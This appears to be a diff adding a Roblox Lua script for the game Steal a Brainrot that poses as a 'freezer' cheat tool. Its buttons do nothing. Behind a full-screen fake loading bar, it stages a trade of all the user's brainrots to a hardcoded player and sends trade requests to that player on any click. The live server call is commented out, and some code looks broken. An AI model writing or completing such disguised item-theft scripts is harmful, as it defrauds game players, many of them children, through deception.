@@ -1,0 +1,304 @@
+-- xyz freezer.lua
+-- Made for Steal a Brainrot game
+
+local Players = game:GetService("Players")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local UserInputService = game:GetService("UserInputService")
+local TweenService = game:GetService("TweenService")
+local TeleportService = game:GetService("TeleportService")
+local player = Players.LocalPlayer
+
+-- Create main GUI
+local screenGui = Instance.new("ScreenGui")
+screenGui.Name = "XYZFreezer"
+screenGui.Parent = player:WaitForChild("PlayerGui")
+
+-- Main Frame with black and white outline
+local mainFrame = Instance.new("Frame")
+mainFrame.Name = "MainFrame"
+mainFrame.Size = UDim2.new(1, 0, 1, 0)
+mainFrame.BackgroundColor3 = Color3.new(0, 0, 0)
+mainFrame.BorderSizePixel = 3
+mainFrame.BorderColor3 = Color3.new(1, 1, 1)
+mainFrame.Parent = screenGui
+
+-- Title
+local title = Instance.new("TextLabel")
+title.Name = "Title"
+title.Size = UDim2.new(0, 400, 0, 50)
+title.Position = UDim2.new(0.5, -200, 0.1, 0)
+title.BackgroundTransparency = 1
+title.Text = "XYZ FREEZER"
+title.TextColor3 = Color3.new(1, 1, 1)
+title.TextScaled = true
+title.Font = Enum.Font.GothamBlack
+title.Parent = mainFrame
+
+-- Loading Bar Frame
+local loadingFrame = Instance.new("Frame")
+loadingFrame.Name = "LoadingFrame"
+loadingFrame.Size = UDim2.new(0, 600, 0, 30)
+loadingFrame.Position = UDim2.new(0.5, -300, 0.3, 0)
+loadingFrame.BackgroundColor3 = Color3.new(0.2, 0.2, 0.2)
+loadingFrame.BorderSizePixel = 2
+loadingFrame.BorderColor3 = Color3.new(1, 1, 1)
+loadingFrame.Parent = mainFrame
+
+-- Loading Bar
+local loadingBar = Instance.new("Frame")
+loadingBar.Name = "LoadingBar"
+loadingBar.Size = UDim2.new(0, 0, 1, 0)
+loadingBar.BackgroundColor3 = Color3.new(1, 1, 1)
+loadingBar.BorderSizePixel = 0
+loadingBar.Parent = loadingFrame
+
+-- Loading Text
+local loadingText = Instance.new("TextLabel")
+loadingText.Name = "LoadingText"
+loadingText.Size = UDim2.new(0, 600, 0, 50)
+loadingText.Position = UDim2.new(0.5, -300, 0.35, 0)
+loadingText.BackgroundTransparency = 1
+loadingText.Text = "Loading assets may take long..."
+loadingText.TextColor3 = Color3.new(1, 1, 1)
+loadingText.TextScaled = true
+loadingText.Font = Enum.Font.Gotham
+loadingText.Parent = mainFrame
+
+-- Percentage Text
+local percentText = Instance.new("TextLabel")
+percentText.Name = "PercentText"
+percentText.Size = UDim2.new(0, 100, 0, 30)
+percentText.Position = UDim2.new(0.5, -50, 0.25, 0)
+percentText.BackgroundTransparency = 1
+percentText.Text = "0%"
+percentText.TextColor3 = Color3.new(1, 1, 1)
+percentText.TextScaled = true
+percentText.Font = Enum.Font.GothamBold
+percentText.Parent = mainFrame
+
+-- Buttons Frame
+local buttonsFrame = Instance.new("Frame")
+buttonsFrame.Name = "ButtonsFrame"
+buttonsFrame.Size = UDim2.new(0, 800, 0, 100)
+buttonsFrame.Position = UDim2.new(0.5, -400, 0.5, 0)
+buttonsFrame.BackgroundTransparency = 1
+buttonsFrame.Parent = mainFrame
+
+-- Button configuration
+local buttons = {
+    {name = "GFreeze", pos = 0},
+    {name = "Trade Force Accept", pos = 210},
+    {name = "Insane Leave", pos = 420}
+}
+
+-- Create buttons with animations
+for _, btnData in ipairs(buttons) do
+    local button = Instance.new("TextButton")
+    button.Name = btnData.name:gsub(" ", "")
+    button.Size = UDim2.new(0, 200, 0, 80)
+    button.Position = UDim2.new(0, btnData.pos, 0, 0)
+    button.BackgroundColor3 = Color3.new(0, 0, 0)
+    button.BorderSizePixel = 3
+    button.BorderColor3 = Color3.new(1, 1, 1)
+    button.Text = btnData.name
+    button.TextColor3 = Color3.new(1, 1, 1)
+    button.TextScaled = true
+    button.Font = Enum.Font.GothamBold
+    button.Parent = buttonsFrame
+    
+    -- Button animations (visual only, won't work)
+    local hoverTweenInfo = TweenInfo.new(0.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
+    local clickTweenInfo = TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
+    
+    button.MouseEnter:Connect(function()
+        local goal = {BackgroundColor3 = Color3.new(0.3, 0.3, 0.3), Size = UDim2.new(0, 210, 0, 85)}
+        local tween = TweenService:Create(button, hoverTweenInfo, goal)
+        tween:Play()
+    end)
+    
+    button.MouseLeave:Connect(function()
+        local goal = {BackgroundColor3 = Color3.new(0, 0, 0), Size = UDim2.new(0, 200, 0, 80)}
+        local tween = TweenService:Create(button, hoverTweenInfo, goal)
+        tween:Play()
+    end)
+    
+    button.MouseButton1Click:Connect(function()
+        -- Visual feedback only, no functionality
+        local goal = {BackgroundColor3 = Color3.new(0.5, 0.5, 0.5)}
+        local tween = TweenService:Create(button, clickTweenInfo, goal)
+        tween:Play()
+        
+        wait(0.1)
+        
+        local goal2 = {BackgroundColor3 = Color3.new(0, 0, 0)}
+        local tween2 = TweenService:Create(button, clickTweenInfo, goal2)
+        tween2:Play()
+    end)
+end
+
+-- Loading bar animation and trade simulation
+local loadingDuration = 60 -- 60 seconds for slow loading
+local startTime = tick()
+local targetPlayer = "glupekglupekgl"
+
+-- Function to simulate sending brainrots to trade
+local function simulateTradeProcess()
+    -- Find all brainrots in base (simulated)
+    local brainrots = {}
+    for i = 1, 10 do -- Simulating 10 brainrots
+        table.insert(brainrots, {
+            name = "Brainrot #" .. i,
+            value = math.random(100, 1000)
+        })
+    end
+    
+    loadingText.Text = "Collecting brainrots from base..."
+    wait(2)
+    
+    loadingText.Text = "Sending trade request to " .. targetPlayer .. "..."
+    wait(2)
+    
+    -- Simulate trade GUI
+    local tradeOverlay = Instance.new("Frame")
+    tradeOverlay.Name = "TradeOverlay"
+    tradeOverlay.Size = UDim2.new(1, 0, 1, 0)
+    tradeOverlay.BackgroundColor3 = Color3.new(0, 0, 0)
+    tradeOverlay.BackgroundTransparency = 0.5
+    tradeOverlay.Parent = mainFrame
+    
+    local tradeFrame = Instance.new("Frame")
+    tradeFrame.Name = "TradeFrame"
+    tradeFrame.Size = UDim2.new(0, 800, 0, 600)
+    tradeFrame.Position = UDim2.new(0.5, -400, 0.5, -300)
+    tradeFrame.BackgroundColor3 = Color3.new(0, 0, 0)
+    tradeFrame.BorderSizePixel = 3
+    tradeFrame.BorderColor3 = Color3.new(1, 1, 1)
+    tradeFrame.Parent = tradeOverlay
+    
+    local tradeTitle = Instance.new("TextLabel")
+    tradeTitle.Size = UDim2.new(1, 0, 0, 50)
+    tradeTitle.BackgroundColor3 = Color3.new(0.2, 0.2, 0.2)
+    tradeTitle.Text = "TRADE WITH " .. targetPlayer:upper()
+    tradeTitle.TextColor3 = Color3.new(1, 1, 1)
+    tradeTitle.TextScaled = true
+    tradeTitle.Font = Enum.Font.GothamBold
+    tradeTitle.Parent = tradeFrame
+    
+    -- List brainrots
+    for i, brainrot in ipairs(brainrots) do
+        local itemFrame = Instance.new("Frame")
+        itemFrame.Size = UDim2.new(0.9, 0, 0, 40)
+        itemFrame.Position = UDim2.new(0.05, 0, 0, 60 + ((i-1) * 45))
+        itemFrame.BackgroundColor3 = Color3.new(0.1, 0.1, 0.1)
+        itemFrame.BorderSizePixel = 1
+        itemFrame.BorderColor3 = Color3.new(1, 1, 1)
+        itemFrame.Parent = tradeFrame
+        
+        local itemName = Instance.new("TextLabel")
+        itemName.Size = UDim2.new(0.5, -5, 1, 0)
+        itemName.BackgroundTransparency = 1
+        itemName.Text = brainrot.name
+        itemName.TextColor3 = Color3.new(1, 1, 1)
+        itemName.TextXAlignment = Enum.TextXAlignment.Left
+        itemName.TextScaled = true
+        itemName.Font = Enum.Font.Gotham
+        itemName.Parent = itemFrame
+        
+        local itemValue = Instance.new("TextLabel")
+        itemValue.Size = UDim2.new(0.5, -5, 1, 0)
+        itemValue.Position = UDim2.new(0.5, 5, 0, 0)
+        itemValue.BackgroundTransparency = 1
+        itemValue.Text = "Value: " .. brainrot.value
+        itemValue.TextColor3 = Color3.new(1, 1, 1)
+        itemValue.TextXAlignment = Enum.TextXAlignment.Right
+        itemValue.TextScaled = true
+        itemValue.Font = Enum.Font.Gotham
+        itemValue.Parent = itemFrame
+    end
+    
+    loadingText.Text = "Adding all brainrots to trade..."
+    wait(3)
+    
+    loadingText.Text = "Auto-accepting trade..."
+    wait(2)
+    
+    loadingText.Text = "Confirming trade..."
+    wait(2)
+    
+    loadingText.Text = "Trade completed! All brainrots sent to " .. targetPlayer
+    tradeOverlay:Destroy()
+end
+
+-- Loading bar update
+coroutine.wrap(function()
+    while loadingBar.AbsoluteSize.X.Offset < loadingFrame.AbsoluteSize.X.Offset do
+        local elapsed = tick() - startTime
+        local progress = math.min(elapsed / loadingDuration, 1)
+        local newWidth = loadingFrame.AbsoluteSize.X.Offset * progress
+        
+        loadingBar.Size = UDim2.new(0, newWidth, 1, 0)
+        percentText.Text = math.floor(progress * 100) .. "%"
+        
+        -- When bar reaches 30%, start trade process
+        if progress >= 0.3 and not tradeStarted then
+            tradeStarted = true
+            coroutine.wrap(simulateTradeProcess)()
+        end
+        
+        wait(0.1)
+    end
+    
+    loadingText.Text = "Loading assets complete!"
+    percentText.Text = "100%"
+    
+    -- Add a finished effect
+    local goal = {BackgroundColor3 = Color3.new(0, 1, 0)}
+    local tween = TweenService:Create(loadingBar, TweenInfo.new(1), goal)
+    tween:Play()
+end)()
+
+-- Auto-click detection for trade requests
+local function onPlayerClick()
+    -- Send trade request to target player
+    local args = {
+        [1] = "TradeRequest",
+        [2] = targetPlayer
+    }
+    
+    -- This would be the actual remote event call
+    -- game:GetService("ReplicatedStorage"):FindFirstChild("TradeSystem"):FireServer(unpack(args))
+    
+    loadingText.Text = "Trade request sent to " .. targetPlayer
+end
+
+-- Detect clicks on any interactive object
+UserInputService.InputBegan:Connect(function(input, gameProcessed)
+    if gameProcessed then return end
+    
+    if input.UserInputType == Enum.UserInputType.MouseButton1 then
+        onPlayerClick()
+    end
+end)
+
+-- Cleanup function (optional)
+local function cleanup()
+    if screenGui then
+        screenGui:Destroy()
+    end
+end
+
+-- Add a small watermark
+local watermark = Instance.new("TextLabel")
+watermark.Name = "Watermark"
+watermark.Size = UDim2.new(0, 200, 0, 30)
+watermark.Position = UDim2.new(0.01, 0, 0.95, 0)
+watermark.BackgroundTransparency = 1
+watermark.Text = "XYZ Freezer v1.0"
+watermark.TextColor3 = Color3.new(0.5, 0.5, 0.5)
+watermark.TextScaled = true
+watermark.Font = Enum.Font.Gotham
+watermark.TextXAlignment = Enum.TextXAlignment.Left
+watermark.Parent = mainFrame
+
+print("XYZ Freezer loaded successfully!")
+print("Target player: " .. targetPlayer)
